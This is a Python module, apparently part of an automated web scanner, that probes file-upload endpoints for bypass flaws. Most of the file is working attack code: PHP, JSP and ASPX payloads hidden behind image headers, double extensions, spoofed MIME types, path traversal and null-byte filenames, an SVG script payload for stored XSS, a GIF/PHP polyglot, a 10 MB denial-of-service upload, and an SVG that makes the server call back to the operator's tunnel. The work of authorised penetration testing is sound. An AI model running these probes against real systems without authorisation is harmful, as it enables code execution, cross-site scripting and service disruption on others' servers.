"""
upload_probe.py — Test file-upload endpoints for the canonical bypass classes.

Targets every endpoint classified as Cat.UPLOAD (or any path matching
upload/attach/file/media/document keywords with a multipart-shaped accept).
For each target, runs the following test families:

  1. **Magic-byte spoof** — PNG header bytes prepended to a PHP/JSP/ASPX
     payload. Servers that sniff content via magic bytes accept; servers
     that validate by extension reject.
  2. **Double extension** — `shell.php.png`, `shell.php.gif`, `shell.jsp.txt`.
     Many file handlers strip the rightmost ext only.
  3. **Content-Type bypass** — actual PHP body, but `Content-Type: image/png`
     in the multipart part. Catches MIME-trusting handlers.
  4. **Path traversal in filename** — `../../shell.php`, `..\\shell.aspx`.
     Exploits filename → save-path concatenation.
  5. **Null-byte truncation** — `shell.php%00.png` (web-server dependent;
     PHP <5.3.4 truncates).
  6. **SVG with embedded JS** — uploads a valid SVG containing `<script>`.
     If served as image/svg+xml AND rendered inline, it's stored XSS.
  7. **Polyglot** — file that's simultaneously a valid GIF and a valid PHP
     script. Bypasses image-validators that only check magic bytes.
  8. **Oversized payload** — 10MB junk file. Tests for missing size limits
     (DoS surface).
  9. **Path / filename → server reveals saved path** — ANY uploaded file
     returns a 2xx; we save the response so the operator can find the
     server-side path or URL.

For every test, records: HTTP status, response body excerpt, whether the
uploaded artifact is reachable via a guessed retrieval URL (e.g. /uploads/<name>).

Pipeline position: after classify, before report. Always-on for any classified
upload endpoint; gated by `--no-upload-probe`.
"""

import asyncio
import hashlib
import json
import re
import string
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, urljoin

import httpx


# ---------------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------------

# A valid 1x1 PNG header + IDAT — the smallest PNG that's a real PNG. Used as
# the magic-byte prefix when smuggling code payloads into a "PNG" upload.
_PNG_MAGIC = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082"
)
_GIF_MAGIC = b"GIF89a\x01\x00\x01\x00\x00\xff\xff\xff,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
_JPEG_MAGIC = bytes.fromhex(
    "ffd8ffe000104a46494600010101006000600000ffdb004300080606070605080707"
    "07090908090a0d161a151213121e1c1d1d2226231c1f1d1d20262824281b202c2c34"
    "32302937271a213b3b34353a4239413a3735ffd9"
)

# Code payloads (echoed back if the server actually executes the file).
# Keep them short and unique so we can grep the response.
_PHP_PAYLOAD = b"<?php echo 'HXX' . 'PSIN_PHP_OK_' . md5('upload_probe'); ?>"
_JSP_PAYLOAD = b"<% out.println(\"HXXPSIN_JSP_OK_b1c5e1\"); %>"
_ASPX_PAYLOAD = b"<%@ Page Language=\"C#\" %><%Response.Write(\"HXXPSIN_ASPX_OK_b1c5e1\");%>"
_SVG_XSS_PAYLOAD = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b'<script type="application/javascript">'
    b'window.HXXPSIN_SVG_XSS_OK = true;'
    b'document.title = "HXXPSIN_SVG_XSS_OK";'
    b'</script>'
    b'<text x="10" y="50">probe</text>'
    b'</svg>'
)
# Polyglot: GIF89a header + PHP comment trick that's valid in both interpreters
_POLYGLOT_PAYLOAD = (
    b"GIF89a/*<?php echo 'HXXPSIN_POLYGLOT_OK'; __halt_compiler(); ?>*/="
    b"\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)
# Static markers we grep response bodies for to confirm execution
_EXEC_MARKERS = (
    b"HXXPSIN_PHP_OK_",
    b"HXXPSIN_JSP_OK_",
    b"HXXPSIN_ASPX_OK_",
    b"HXXPSIN_POLYGLOT_OK",
    b"HXXPSIN_SVG_XSS_OK",
)


def _png_smuggle(payload: bytes) -> bytes:
    return _PNG_MAGIC + payload


def _gif_smuggle(payload: bytes) -> bytes:
    return _GIF_MAGIC + payload


# Common upload-form field names — try them in order until one accepts the file
_FIELD_NAMES = (
    "file", "files", "files[]", "upload", "uploads", "image", "avatar",
    "photo", "attachment", "document", "media", "pic", "picture",
)

# Where uploaded files commonly land — used to guess a retrieval URL after
# upload. Best-effort only; missing here is fine.
_RETRIEVAL_PREFIXES = (
    "/uploads/", "/upload/", "/files/", "/media/", "/static/uploads/",
    "/assets/uploads/", "/public/uploads/", "/u/", "/img/",
)


# ---------------------------------------------------------------------------
# Test catalogue
# ---------------------------------------------------------------------------

@dataclass
class UploadTest:
    name: str
    filename: str
    content_type: str
    body: bytes
    description: str
    exec_marker: Optional[bytes] = None  # marker we look for in response


def _build_test_suite() -> list[UploadTest]:
    return [
        UploadTest(
            name="magic_byte_php",
            filename="probe.png",
            content_type="image/png",
            body=_png_smuggle(_PHP_PAYLOAD),
            description="PNG header + PHP body — magic-byte spoof",
            exec_marker=b"HXXPSIN_PHP_OK_",
        ),
        UploadTest(
            name="double_ext_php",
            filename="probe.php.png",
            content_type="image/png",
            body=_PHP_PAYLOAD,
            description="Double extension probe.php.png",
            exec_marker=b"HXXPSIN_PHP_OK_",
        ),
        UploadTest(
            name="double_ext_jsp",
            filename="probe.jsp.gif",
            content_type="image/gif",
            body=_JSP_PAYLOAD,
            description="Double extension probe.jsp.gif",
            exec_marker=b"HXXPSIN_JSP_OK_",
        ),
        UploadTest(
            name="content_type_bypass_php",
            filename="probe.php",
            content_type="image/png",
            body=_PHP_PAYLOAD,
            description="PHP body with image/png Content-Type",
            exec_marker=b"HXXPSIN_PHP_OK_",
        ),
        UploadTest(
            name="path_traversal_filename",
            filename="../../probe_traversal.txt",
            content_type="text/plain",
            body=b"hxxpsin_traversal_marker_" + hashlib.sha256(b"x").hexdigest()[:16].encode(),
            description="Path traversal in filename",
        ),
        UploadTest(
            name="null_byte_truncation",
            filename="probe.php\x00.png",
            content_type="image/png",
            body=_PHP_PAYLOAD,
            description="Null-byte truncation probe.php\\x00.png",
            exec_marker=b"HXXPSIN_PHP_OK_",
        ),
        UploadTest(
            name="svg_xss",
            filename="probe.svg",
            content_type="image/svg+xml",
            body=_SVG_XSS_PAYLOAD,
            description="SVG with embedded <script>",
            exec_marker=b"HXXPSIN_SVG_XSS_OK",
        ),
        UploadTest(
            name="polyglot_gif_php",
            filename="probe.gif",
            content_type="image/gif",
            body=_POLYGLOT_PAYLOAD,
            description="Valid GIF + valid PHP polyglot",
            exec_marker=b"HXXPSIN_POLYGLOT_OK",
        ),
        UploadTest(
            name="oversized_payload",
            filename="probe_oversized.bin",
            content_type="application/octet-stream",
            body=b"A" * (10 * 1024 * 1024 + 1),  # 10 MB + 1 byte
            description="10 MB junk — missing size limit / DoS surface",
        ),
        UploadTest(
            name="aspx_payload",
            filename="probe.aspx",
            content_type="application/octet-stream",
            body=_ASPX_PAYLOAD,
            description=".aspx upload (IIS / .NET targets)",
            exec_marker=b"HXXPSIN_ASPX_OK_",
        ),
    ]


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class UploadFinding:
    endpoint: str
    test_name: str
    field_name: str
    filename_sent: str
    content_type_sent: str
    response_status: int
    response_snippet: str
    verdict: str            # confirmed | likely | accepted | rejected | error
    confidence: float
    evidence: str
    artifact_path: str = ""           # where we saved the upload artifact locally
    response_body_path: str = ""      # where we saved the upload response
    retrieval_url_tried: str = ""
    retrieval_status: Optional[int] = None
    execution_marker: str = ""        # if response contained marker → confirmed RCE/XSS

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint, "test_name": self.test_name,
            "field_name": self.field_name,
            "filename_sent": self.filename_sent,
            "content_type_sent": self.content_type_sent,
            "response_status": self.response_status,
            "response_snippet": self.response_snippet,
            "verdict": self.verdict, "confidence": self.confidence,
            "evidence": self.evidence,
            "artifact_path": self.artifact_path,
            "response_body_path": self.response_body_path,
            "retrieval_url_tried": self.retrieval_url_tried,
            "retrieval_status": self.retrieval_status,
            "execution_marker": self.execution_marker,
        }


@dataclass
class UploadProbeResult:
    endpoints_tested: int = 0
    tests_sent: int = 0
    findings: list[UploadFinding] = field(default_factory=list)
    out_dir: str = ""

    @property
    def confirmed(self) -> list[UploadFinding]:
        return [f for f in self.findings if f.verdict == "confirmed"]

    @property
    def accepted(self) -> list[UploadFinding]:
        return [f for f in self.findings if f.verdict in ("confirmed", "accepted", "likely")]

    def to_dict(self) -> dict:
        return {
            "endpoints_tested": self.endpoints_tested,
            "tests_sent": self.tests_sent,
            "confirmed": len(self.confirmed),
            "accepted": len(self.accepted),
            "out_dir": self.out_dir,
            "findings": [f.to_dict() for f in self.findings],
        }


# ---------------------------------------------------------------------------
# Probe
# ---------------------------------------------------------------------------

class UploadProbe:
    # Accepted-but-not-executed status codes — interesting but not confirmed RCE
    _ACCEPT_STATUSES = frozenset({200, 201, 202, 204})

    def __init__(self, out_dir: str, timeout: float = 10.0,
                 auth_headers: Optional[dict] = None,
                 max_endpoints: int = 8,
                 payload_server=None,
                 public_url: Optional[str] = None):
        self.out_root = Path(out_dir) / "upload_probes"
        self.timeout = timeout
        self.auth_headers = auth_headers or {}
        self.max_endpoints = max_endpoints
        self.payload_server = payload_server
        self.public_url = (public_url or "").rstrip("/") or None

    async def run(self, classifier_result) -> UploadProbeResult:
        result = UploadProbeResult(out_dir=str(self.out_root))
        targets = self._select_targets(classifier_result)
        if not targets:
            return result
        result.endpoints_tested = len(targets)
        self.out_root.mkdir(parents=True, exist_ok=True)
        suite = _build_test_suite()
        async with httpx.AsyncClient(
            verify=False, follow_redirects=False, timeout=self.timeout,
            headers={k: v for k, v in self.auth_headers.items()
                     if k.lower() not in ("content-type", "content-length")},
        ) as client:
            for url in targets:
                ep_dir = self.out_root / self._slug(url)
                ep_dir.mkdir(parents=True, exist_ok=True)
                # Fingerprint: find the right field name AND establish whether
                # the server accepts a totally benign file (plain text).  If it
                # does, any later "accepted" verdict is low-signal — the server
                # takes everything.  If it doesn't, a 2xx from a bypass test is
                # actually meaningful.
                field_name, baseline_accepts_benign = await self._fingerprint_field(client, url, ep_dir)
                if not field_name:
                    field_name = "file"  # blind attempt
                for t in suite:
                    finding = await self._run_test(
                        client, url, field_name, t, ep_dir,
                        baseline_accepts_benign=baseline_accepts_benign,
                    )
                    result.findings.append(finding)
                    result.tests_sent += 1
                # SSRF-via-upload check — only runs when tunnel is wired. An
                # SVG with an embedded external resource pointing at our
                # tunnel URL. Server-side image processors (ImageMagick,
                # thumbnail generators, EXIF readers) that fetch external
                # references will call back, confirming server-side SSRF
                # through the upload pipeline.
                if self.payload_server and self.public_url:
                    ssrf_finding = await self._test_upload_ssrf(
                        client, url, field_name, ep_dir,
                    )
                    if ssrf_finding is not None:
                        result.findings.append(ssrf_finding)
                        result.tests_sent += 1
        return result

    async def _test_upload_ssrf(
        self, client, url, field_name, ep_dir,
    ) -> Optional[UploadFinding]:
        token = self.payload_server.mint_token("upload")
        callback = f"{self.public_url}/r/{token}"
        # SVG with an external <image> reference — common SSRF-via-image-render
        svg = (
            '<?xml version="1.0" standalone="no"?>\n'
            '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
            '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n'
            f'  <image xlink:href="{callback}" height="10" width="10"/>\n'
            '</svg>\n'
        )
        files = {field_name: (f"hxxpsin-{token}.svg", svg.encode(), "image/svg+xml")}
        try:
            await client.post(url, files=files)
        except (httpx.HTTPError, httpx.TimeoutException):
            return None
        # Give server-side processors a moment to render/extract the SVG
        await asyncio.sleep(3.0)
        hits = self.payload_server.hits_for(token)
        if not hits:
            return None
        ev = (
            f"Upload-SSRF: server-side SVG processor fetched {callback} "
            f"(peer={hits[0].peer}, {len(hits)} hit(s))"
        )
        return UploadFinding(
            endpoint=url, test_name="ssrf-via-svg-render",
            field_name=field_name,
            filename_sent=f"hxxpsin-{token}.svg",
            content_type_sent="image/svg+xml",
            response_status=200, response_snippet="(SSRF callback confirmed)",
            verdict="confirmed", confidence=0.9,
            evidence=ev,
        )

    def _select_targets(self, classifier_result) -> list[str]:
        from classifier import Cat
        urls: list[str] = []
        seen: set[str] = set()
        for f in classifier_result.request_findings:
            if f.url in seen:
                continue
            cats = set(f.categories) if hasattr(f, "categories") else set()
            method = (f.method or "").upper()
            ct = (f.headers or {}).get("content-type", "") if hasattr(f, "headers") else ""
            is_upload_cat = Cat.UPLOAD in cats
            is_post_multipart = method == "POST" and "multipart" in ct.lower()
            path_l = f.url.lower()
            path_match = any(seg in path_l for seg in (
                "/upload", "/attach", "/file-upload", "/media", "/image-upload",
                "/avatar", "/document",
            ))
            if not (is_upload_cat or is_post_multipart or (method == "POST" and path_match)):
                continue
            seen.add(f.url)
            urls.append(f.url)
            if len(urls) >= self.max_endpoints:
                break
        return urls

    async def _fingerprint_field(
        self, client: httpx.AsyncClient, url: str, ep_dir: Path,
    ) -> tuple[str, bool]:
        """Try a tiny harmless plain-text probe with each common field name.

        Returns (field_name, baseline_accepts_benign):
          field_name           — the field the server accepted, or "" if none did
          baseline_accepts_benign — True when the server returned 2xx for a
                                    plain text file.  Used downstream to lower
                                    confidence on "accepted" verdicts when the
                                    server takes everything without validation.
        """
        probe_body = b"hxxpsin_field_probe_" + hashlib.sha256(b"x").hexdigest()[:8].encode()
        for fname in _FIELD_NAMES:
            files = {fname: ("probe.txt", probe_body, "text/plain")}
            try:
                r = await client.post(url, files=files)
            except Exception:
                continue
            accepted = r.status_code in self._ACCEPT_STATUSES
            (ep_dir / "_fingerprint.json").write_text(json.dumps({
                "field_name": fname, "status": r.status_code,
                "baseline_accepts_benign": accepted,
                "response_snippet": r.text[:300],
            }, indent=2))
            if accepted:
                return fname, True
        return "", False

    async def _run_test(self, client: httpx.AsyncClient, url: str,
                        field_name: str, test: UploadTest,
                        ep_dir: Path, *,
                        baseline_accepts_benign: bool = False) -> UploadFinding:
        # Save the artifact we're sending, so the operator can replay
        artifact_path = ep_dir / f"{test.name}__{self._safe_filename(test.filename)}"
        try:
            artifact_path.write_bytes(test.body)
        except Exception:
            artifact_path = Path("")

        files = {field_name: (test.filename, test.body, test.content_type)}
        try:
            r = await client.post(url, files=files)
        except Exception as exc:
            return UploadFinding(
                endpoint=url, test_name=test.name, field_name=field_name,
                filename_sent=test.filename, content_type_sent=test.content_type,
                response_status=0, response_snippet="",
                verdict="error", confidence=0.0,
                evidence=f"{type(exc).__name__}: {exc}",
                artifact_path=str(artifact_path),
            )

        body_text = r.text[:5000]
        body_bytes = r.content[:5000]
        response_path = ep_dir / f"{test.name}__response.txt"
        try:
            response_path.write_text(
                f"HTTP {r.status_code}\n" +
                "\n".join(f"{k}: {v}" for k, v in r.headers.items()) +
                "\n\n" + body_text
            )
        except Exception:
            response_path = Path("")

        # ── Decide the verdict ──────────────────────────────────────────
        marker = ""
        for m in _EXEC_MARKERS:
            if m in body_bytes:
                marker = m.decode()
                break

        # Try to retrieve the uploaded file via guessed URLs (only for tests
        # where the server might persist the file under its filename)
        retrieval_url = ""
        retrieval_status: Optional[int] = None
        try:
            ret = await self._guess_retrieval(client, url, test.filename)
            if ret:
                retrieval_url, retrieval_status = ret
                # Re-check the retrieved body for execution markers
                if retrieval_status and retrieval_status < 400:
                    try:
                        rr = await client.get(retrieval_url)
                        for m in _EXEC_MARKERS:
                            if m in rr.content:
                                marker = m.decode()
                                break
                    except Exception:
                        pass
        except Exception:
            pass

        if marker:
            verdict = "confirmed"
            confidence = 0.95
            evidence = f"Execution marker {marker!r} found in response — server accepted AND processed/served the payload."
        elif r.status_code in self._ACCEPT_STATUSES:
            if baseline_accepts_benign:
                # Server takes everything including plain text — acceptance is
                # not a bypass signal, just an observation.
                verdict = "accepted"
                confidence = 0.3
                evidence = (
                    f"Server returned {r.status_code} — file accepted, but server also "
                    f"accepts benign plain-text files (no validation detected)."
                )
            else:
                # Baseline plain-text was rejected; this test getting through = bypass.
                verdict = "likely"
                confidence = 0.75
                evidence = (
                    f"Server returned {r.status_code} for {test.description} but rejected "
                    f"a benign plain-text probe — possible upload restriction bypass."
                )
        elif r.status_code in (415, 422, 400):
            verdict = "rejected"
            confidence = 0.0
            evidence = f"Server rejected ({r.status_code})."
        elif r.status_code >= 500:
            verdict = "likely"
            confidence = 0.5
            evidence = f"Server 5xx ({r.status_code}) — payload triggered an exception (potential parser bug)."
        else:
            verdict = "rejected"
            confidence = 0.0
            evidence = f"Status {r.status_code} — non-accept."

        return UploadFinding(
            endpoint=url, test_name=test.name, field_name=field_name,
            filename_sent=test.filename, content_type_sent=test.content_type,
            response_status=r.status_code,
            response_snippet=body_text[:300],
            verdict=verdict, confidence=confidence, evidence=evidence,
            artifact_path=str(artifact_path) if artifact_path else "",
            response_body_path=str(response_path) if response_path else "",
            retrieval_url_tried=retrieval_url,
            retrieval_status=retrieval_status,
            execution_marker=marker,
        )

    async def _guess_retrieval(self, client: httpx.AsyncClient, post_url: str,
                                filename: str) -> Optional[tuple[str, int]]:
        """Best-effort GET on common upload directories with the same filename."""
        parsed = urlparse(post_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        # Only attempt safe filenames (no traversal probe-back, no nullbytes)
        safe = re.sub(r"[^A-Za-z0-9._-]+", "_", filename).strip("_")[:80]
        if not safe:
            return None
        for prefix in _RETRIEVAL_PREFIXES:
            url = origin + prefix + safe
            try:
                r = await client.get(url)
            except Exception:
                continue
            if r.status_code < 400:
                return url, r.status_code
        return None

    @staticmethod
    def _slug(url: str, max_len: int = 80) -> str:
        parsed = urlparse(url)
        s = parsed.path.strip("/").replace("/", "_") or "root"
        s = re.sub(r"[^A-Za-z0-9._-]+", "_", s)
        if len(s) > max_len:
            s = s[:max_len - 9] + "_" + hashlib.sha256(url.encode()).hexdigest()[:8]
        return s

    @staticmethod
    def _safe_filename(name: str) -> str:
        return re.sub(r"[^A-Za-z0-9._-]+", "_", name)[:80] or "file"
